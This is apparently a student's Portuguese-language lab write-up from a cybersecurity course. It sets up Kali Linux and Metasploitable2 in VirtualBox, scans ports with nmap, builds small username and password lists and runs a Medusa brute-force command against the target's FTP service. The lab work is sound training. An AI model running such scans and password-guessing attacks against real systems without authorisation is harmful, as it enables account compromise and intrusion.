# Simulando um Ataque de Brute-Force de Senhas com Medusa e Kali Linux

Passo a passo do que eu aprendi no curso de cibersegurança na DIO.

---

## Passo 1 - Virtualbox com Kali Linux e Metasploitable2

Configuração inicial do ambiente de laboratório utilizando o Oracle VirtualBox, contendo as máquinas virtuais do Kali Linux (sistema atacante) e do Metasploitable2 (sistema alvo vulnerável).


"<img width="813" height="573" alt="1VirtualboxKaliLinuxeMetasportable2" src="https://github.com/user-attachments/assets/9c902cf0-e7d2-42b8-940f-dd32ab34ec4b" />

---

## Configuração de Rede no Kali Linux

Ajuste das configurações de rede do Kali Linux no VirtualBox para garantir a comunicação isolada e segura com a máquina alvo através de uma Rede NAT.


"<img width="903" height="518" alt="2configuracao deredenoKali Linux" src="https://github.com/user-attachments/assets/a7781438-bb7f-4da0-be79-e257d3fd2df8" />


---

## Configuração de Rede no Metasploitable2

Configuração idêntica da placa de rede para o Metasploitable2, permitindo que ambas as máquinas virtuais enxerguem uma a outra no mesmo ambiente de testes.


"<img width="902" height="521" alt="3configurcaoderedenoMeasploitable2" src="https://github.com/user-attachments/assets/66fb4f5e-fc31-4018-858b-85b985e994b9" />

## Passo 2 - Ambiente com Kali Linux e Metasploitable2 ataque
Metasploitable2 comando ip a para sabermos o ip do usuário e ver se as duas maquinas estão interagindo entre si.

"<img width="1619" height="762" alt="4interacaoentreolinuxeometasploit" src="https://github.com/user-attachments/assets/f33256d1-dd3a-41ae-a401-32cdec839c6c" />

## Comando ping -c 3 no Linux 

"<img width="1463" height="760" alt="5comandoping" src="https://github.com/user-attachments/assets/e238f372-bba5-428f-8d61-d4e4df141194" />

## Comando nmap -Sv -p 21,22,80,445,139 [ip do alvo] para vermos se tem portas abertas.

"<img width="949" height="738" alt="6comandonmap" src="https://github.com/user-attachments/assets/aba01135-f542-4ad7-a179-c344c2a50ca8" />


## Passo 3 - Criando arquivos de textos de lista de usuários e senhas comuns no Kali Linux

## Comando para criar lista de usuarios: echo -e ¨user\nmsfadmin\nadmin\nroot¨ > users.txt
## Comando para criar lista de senhas: echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

"<img width="1406" height="739" alt="7comandocriarusuariosesenhas" src="https://github.com/user-attachments/assets/b52d3b16-865c-4bda-b02d-eb3254161d60" />


## Passo 4- Ativando o Medusa

## Opção A: Se o teu objetivo é atacar um servidor FTP (com uma lista de utilizadores e um dicionário de passwords)
Deves usar a flag maiúscula -P para o ficheiro de passwords:
Comando: medusa -h [ip do alvo] -U smb_users.txt -P pass.txt -M ftp -t 6

"<img width="913" height="604" alt="8usuariesenhaftp" src="https://github.com/user-attachments/assets/a97fbd84-3544-4380-8b3a-87e9e1b14b44" />































